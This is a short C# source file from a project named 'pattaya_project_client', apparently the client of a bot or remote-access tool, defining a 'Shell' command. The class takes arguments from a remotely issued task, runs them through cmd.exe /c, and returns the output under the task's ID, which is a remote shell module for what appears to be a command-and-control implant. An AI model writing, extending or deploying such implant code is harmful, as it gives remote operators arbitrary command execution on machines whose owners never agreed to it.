using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Services;
using System.IO;

namespace pattaya_project_client.Commands.Implements
{
    public class Shell : BotCommand
    {
        public override string TaskName => "shell";

        public override BotTaskResult RunTask(BotTask task)
        {
            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {task.Arguments}")
            };
            
        }
    }
}
